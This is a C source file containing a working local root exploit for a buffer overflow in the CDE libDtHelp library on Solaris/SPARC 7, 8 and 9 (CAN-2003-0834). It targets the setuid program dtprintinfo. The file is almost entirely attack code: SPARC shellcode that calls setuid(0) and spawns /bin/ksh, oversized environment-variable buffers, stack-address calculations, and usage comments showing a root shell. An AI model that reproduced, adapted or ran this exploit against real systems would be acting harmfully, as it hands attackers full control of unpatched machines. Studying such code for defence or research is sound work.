/*
 * $Id: raptor_libdthelp.c,v 1.1.1.1 2004/12/04 14:35:33 raptor Exp $
 *
 * raptor_libdthelp.c - libDtHelp.so local, Solaris/SPARC 7/8/9
 * Copyright (c) 2003-2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Buffer overflow in CDE libDtHelp library allows local users to execute
 * arbitrary code via a modified DTHELPUSERSEARCHPATH environment variable 
 * and the Help feature (CAN-2003-0834).
 *
 * Possible attack vectors are: DTHELPSEARCHPATH (as used in this exploit), 
 * DTHELPUSERSEARCHPATH, LOGNAME (those two require a slightly different
 * exploitation technique, due to different code paths).
 * 
 * Usage:
 * $ gcc raptor_libdthelp.c -o raptor_libdthelp -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_libdthelp 192.168.1.1:0
 * [on your xserver: enter the dtprintinfo help]
 * # id
 * uid=0(root) gid=1(other)
 * # 
 *
 * Vulnerable platforms:
 * Solaris 7 without patch 107178-03 [tested]
 * Solaris 8 without patch 108949-08 [tested]
 * Solaris 9 without patch 116308-01 [tested]
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define	INFO1	"raptor_libdthelp.c - libDtHelp.so local, Solaris/SPARC 7/8/9"
#define	INFO2	"Copyright (c) 2003-2004 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// default setuid target
#define	BUFSIZE	1200 				// size of the evil buffer
#define	VARSIZE	1024 				// size of the evil env vars

/* voodoo macros */
#define	VOODOO32(_,__,___)	{_--;_+=(__+___-1)%4-_%4<0?8-_%4:4-_%4;}
#define	VOODOO64(_,__,___)	{_+=7-(_+(__+___+1)*4+3)%8;}

char sc[] = /* Solaris/SPARC shellcode (12 + 12 + 48 = 72 bytes) */
/* double setuid() */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
/* execve() */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int 	add_env(char *string);
void 	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], var1[VARSIZE], var2[VARSIZE];
	char	platform[256], release[256], display[256];
	int	i, offset, ret, var1_addr, var2_addr;
	int	plat_len, prog_len, rel;
	
	char	*arg[2] = {"foo", NULL};
	int	arg_len = 4, arg_pos = 1;

	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	rel = atoi(release + 2);

	/* prepare the evil buffer */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;
	memcpy(buf, "DTHELPSEARCHPATH=", 17);

	/* prepare the evil env vars */
	memset(var1, 'B', sizeof(var1));
	var1[sizeof(var1) - 1] = 0x0;
	memset(var2, 'C', sizeof(var2));
	var2[sizeof(var2) - 1] = 0x0;

	/* fill the envp, keeping padding */
	var1_addr = add_env(sc);
	var2_addr = add_env(var1);
	add_env(var2);
	add_env(display);
	add_env("PATH=/usr/bin:/bin:/usr/sbin:/sbin");
	add_env("HOME=/tmp");
	add_env(buf);
	add_env(NULL);

	/* calculate the offset to argv[0] (voodoo magic) */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = arg_len + env_len + plat_len + prog_len;
	if (rel > 7)
		VOODOO64(offset, arg_pos, env_pos)
	else
		VOODOO32(offset, plat_len, prog_len)

	/* calculate the needed addresses */
	ret = sb - offset + arg_len;
	var1_addr += ret;
	var2_addr += ret;
	
	/* fill the evil buffer */
	for (i = 17; i < BUFSIZE - 8; i += 4)
		set_val(buf, i, var1_addr - 5000);

	/* fill the evil env vars */
	for (i = 0; i < VARSIZE - 8; i += 4)
		set_val(var1, i, var2_addr - 500);
	for (i = 0; i < VARSIZE - 8; i += 4)
		set_val(var2, i, ret);

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using var1 address\t: 0x%p\n", (void *)var1_addr);
	fprintf(stderr, "Using var2 address\t: 0x%p\n", (void *)var2_addr);
	fprintf(stderr, "Using ret address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =      (val & 0xff000000) >> 24;
	buf[pos + 1] =  (val & 0x00ff0000) >> 16;
	buf[pos + 2] =  (val & 0x0000ff00) >> 8;
	buf[pos + 3] =  (val & 0x000000ff);
}
